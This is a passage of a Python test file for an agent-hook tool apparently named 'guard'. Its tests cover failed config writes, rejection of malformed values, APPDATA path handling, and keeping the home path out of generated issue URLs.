    out = capsys.readouterr().out
    assert "not JSON" in out and "guard agent fix" in out and "issues/new?" in out


def test_a_failed_config_write_keeps_the_adapter_as_it_was(monkeypatch, capsys):
    import typer
    from guard import cli
    from guard.agent.adapter import adapters_dir, config_path
    adapter = dict(CURSOR, name="widget", config="~/.widget/hooks.json", detect="~/.widget")
    config_path(adapter).parent.mkdir(parents=True, exist_ok=True)
    record = adapters_dir() / "widget.json"
    record.parent.mkdir(parents=True, exist_ok=True)
    record.write_text('{"name": "widget", "old": true}', encoding="utf-8")

    def fail(*a, **k):
        raise OSError("disk full")
    monkeypatch.setattr("guard.agent.adapter.write_config", fail)
    monkeypatch.setattr(cli, "_registered_ok", lambda *a, **k: None)
    monkeypatch.setattr(cli.typer, "confirm", lambda *a, **k: True)
    with pytest.raises(typer.Exit):
        cli._install_adapter(adapter, "widget")
    assert record.read_text(encoding="utf-8") == '{"name": "widget", "old": true}'
    out = capsys.readouterr().out
    assert "disk full" in out and "issues/new?" in out


def test_malformed_values_in_a_config_or_record_are_refused_quietly():
    from guard.agent.adapter import NAME, _is_guard_hook, _is_number
    assert not NAME.match("cursor\n") and not _is_number(float("nan")) and not _is_number(float("inf"))
    assert not _is_guard_hook({"command": "guard", "args": 5})


def test_a_repository_above_a_moved_appdata_folder_is_seen(tmp_path, monkeypatch):
    from guard.agent.adapter import _inside_home
    checkout = tmp_path / "work"
    (checkout / ".git").mkdir(parents=True)
    roaming = checkout / "Roaming"
    (roaming / "Acme").mkdir(parents=True)
    monkeypatch.setenv("APPDATA", str(roaming))
    monkeypatch.delenv("LOCALAPPDATA", raising=False)
    assert not _inside_home(str(roaming / "Acme" / "hooks.json"))


def test_a_config_in_a_moved_appdata_folder_can_be_named_as_discovery_shows_it(tmp_path, monkeypatch):
    from guard.agent.adapter import config_path
    roaming = tmp_path / "profiles" / "me" / "Roaming"
    (roaming / "Acme").mkdir(parents=True)
    monkeypatch.setenv("APPDATA", str(roaming))
    monkeypatch.delenv("LOCALAPPDATA", raising=False)
    adapter = dict(CURSOR, config="%APPDATA%/Acme/hooks.json", detect="%APPDATA%/Acme")
    assert not any("home folder" in e for e in validate_adapter(adapter))
    assert config_path(adapter) == roaming / "Acme" / "hooks.json"
    assert any("home folder" in e for e in validate_adapter(dict(CURSOR, config="%TEMP%/hooks.json")))


def test_the_issue_names_a_config_that_failed_to_write_without_the_full_path(monkeypatch, capsys):
    import typer
    from urllib.parse import unquote
    from guard import cli
    adapter = dict(CURSOR, name="widget", config="~/.widget/hooks.json", detect="~/.widget")
    (home() / ".widget").mkdir(parents=True, exist_ok=True)

    def fail(*a, **k):
        raise OSError(13, "Permission denied", str(home() / ".widget" / "hooks.json"))
    monkeypatch.setattr("guard.agent.adapter.write_config", fail)
    monkeypatch.setattr(cli, "_registered_ok", lambda *a, **k: None)
    monkeypatch.setattr(cli.typer, "confirm", lambda *a, **k: True)
    with pytest.raises(typer.Exit):
        cli._install_adapter(adapter, "widget")
    url = next(line for line in capsys.readouterr().out.splitlines() if "issues/new?" in line)
    assert "~/.widget/hooks.json" in unquote(url) and str(home()) not in unquote(url)
